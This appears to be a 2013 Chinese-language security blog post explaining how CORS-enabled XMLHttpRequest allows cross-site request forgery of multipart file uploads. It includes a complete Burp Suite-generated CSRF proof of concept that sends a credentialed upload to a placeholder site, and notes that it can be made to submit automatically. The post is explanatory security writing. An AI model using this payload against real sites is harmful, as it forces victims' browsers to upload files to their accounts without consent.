
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
   <title>csrf upload file &larr; </title>
   <meta name="author" content="litsand" />

   <link rel="start" href="/" />

	
	
	
  	<link rel="alternate" type="application/atom+xml" href="http://feeds.feedburner.com/feedname" title="RSS feed" />
	
	

   <!-- syntax highlighting CSS -->
   <link rel="stylesheet" href="/assets/themes/mark-reid/css/syntax.css" type="text/css" />

   <!-- Homepage CSS -->
   <link rel="stylesheet" href="/assets/themes/mark-reid/css/screen.css" type="text/css" />

</head>
<body id="">
<div id="site">
  
  <div id="header">
    <h1>
    	<a href="/" title="normal world">normal world</a>
    	<span class="byline">&larr; <a href="/">litsand</a></span>
    </h1>
    <ul class="nav">
      <li><a class="home" href="/">Home</a></li>
      <li><a  href="/archive.html">Archive</a></li>
      <li><a  href="/pages.html">Pages</a></li>
      <li><a  href="/categories.html">Categories</a></li>
      <li><a  href="/tags.html">Tags</a></li>
    </ul>
  </div>

  
<div id="page">
	
  <h1 class="emphnext">csrf upload file</h1>
  <ul class="tag_box inline">
  
  


  
    
  



  </ul>

  <p>大家都知道通常用csrf来上传一个文件是不简单的.问题在于我们创建的假的表单提交的数据跟浏览器文件上传提交的数据有一点不同.那就是上传的请求会有一个filename的参数:</p>

<pre><code>-----------------------------256672629917035
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test2.txt&quot;
Content-Type: text/plain          
test3
-----------------------------256672629917035</code></pre>

<p>如果我们创建一个表单,提交如上的请求是没法成功添加filename参数的,这是因为filename参数是文件上传的input自动生成.这就阻止了邪恶的黑客通过csrf上传文件.不过自从有了html5,一切都不一样了.</p>

<p>html5有一个新特性叫跨域资源共享(CORS http://www.w3.org/TR/cors/).在过去,由于同源策略的影响,黑客没办法通过javascript去访问别的域.考虑到XSS这么泛滥,同源策略真的是让我们的生活更安全了.不过,利用html5的跨域资源共享,可以让javascript来发送有filename属性的合法的跨域请求.这样,只要用户访问了恶意页面,不需要其他的交互,就可以通过csrf来上传文件了.</p>

<p>下面是一个Burp Suite生成的poc.</p>

<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
    &lt;script&gt;
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open(&quot;POST&quot;, &quot;https://example.com/new_file.html&quot;, true);
        xhr.setRequestHeader(&quot;Accept&quot;, &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;);
        xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;de-de,de;q=0.8,en-us;q=0.5,en;q=0.3&quot;);
        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;multipart/form-data; boundary=---------------------------256672629917035&quot;);
        xhr.withCredentials = &quot;true&quot;;
        var body = &quot;-----------------------------256672629917035\r\n&quot; +
          &quot;Content-Disposition: form-data; name=\&quot;message\&quot;\r\n&quot; +
          &quot;\r\n&quot; +
          &quot;\r\n&quot; +
          &quot;-----------------------------256672629917035\r\n&quot; +
          &quot;Content-Disposition: form-data; name=\&quot;backPage\&quot;\r\n&quot; +
          &quot;\r\n&quot; +
          &quot;test\r\n&quot; +
          &quot;-----------------------------256672629917035\r\n&quot; +
          &quot;Content-Disposition: form-data; name=\&quot;dataType\&quot;\r\n&quot; +
          &quot;\r\n&quot; +
          &quot;test  \r\n&quot; +
          &quot;-----------------------------256672629917035\r\n&quot; +
          &quot;Content-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;test2.txt\&quot;\r\n&quot; +
          &quot;Content-Type: text/plain\r\n&quot; +
          &quot;\r\n&quot; +
          &quot;test3\r\n&quot; +
          &quot;-----------------------------256672629917035--\r\n&quot;;
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i &lt; aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      }
    &lt;/script&gt;
    &lt;form action=&quot;#&quot;&gt;
      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; onclick=&quot;submitRequest();&quot; /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>

<p>当然,poc里的提交按钮不是必须的,可以通过javascript自动提交.从某种程度上来说浏览器的最重要的同源策略被突破了.这真是令人忧伤的一件事情.</p>

<p>扩展阅读:</p>

<p>http://blog.kotowicz.net/2011/05/cross-domain-arbitrary-file-upload.html http://blog.kotowicz.net/2011/04/how-to-upload-arbitrary-file-contents.html https://developer.mozilla.org/en-US/docs/HTTP/Access_control_CORS?redirectlocale=en-US&amp;redirectslug=HTTP_access_control http://www.w3.org/TR/cors/</p>

  <address class="signature">
    <a class="author" href="/">litsand</a> 
    <span class="date">19 November 2013</span>
    <span class="location"></span>
  </address>
  
  <div class="prev-next">
  
    <a href="/2013/11/19/google-patch-rewards" class="next" title="google patch rewards">Next Post &rarr;</a>
  
  
    <a href="/2013/11/13/gentoox-server" class="prev" title="gentoo安装X server">&larr; Earlier Post</a>
  
  </div>
  
</div><!-- End Page -->




  
  <div id="footer">
  	<address>
  		<span class="copyright">
  			Content by <a href="/info/site.html">litsand</a>. Design by 
  			<a href="http://mark.reid.name/">Mark Reid</a>
  			<br/>
  			(<a rel="licence" href="http://creativecommons.org/licenses/by-nc-sa/3.0/">Some rights reserved</a>)			
  		</span>
  		<span class="engine">
  			Powered by <a href="http://github.com/mojombo/jekyll/" title="A static, minimalist CMS">Jekyll</a>
  		</span>
  	</address>
  </div>
  
</div>

<!--[if IE 6]>
<script type="text/javascript"> 
	/*Load jQuery if not already loaded*/ if(typeof jQuery == 'undefined'){ document.write("<script type=\"text/javascript\"   src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js\"></"+"script>"); var __noconflict = true; } 
	var IE6UPDATE_OPTIONS = {
		icons_path: "http://static.ie6update.com/hosted/ie6update/images/"
	}
</script>
<script type="text/javascript" src="http://static.ie6update.com/hosted/ie6update/ie6update.js"></script>
<![endif]-->

  


  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-123-12']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>



</body>
</html>

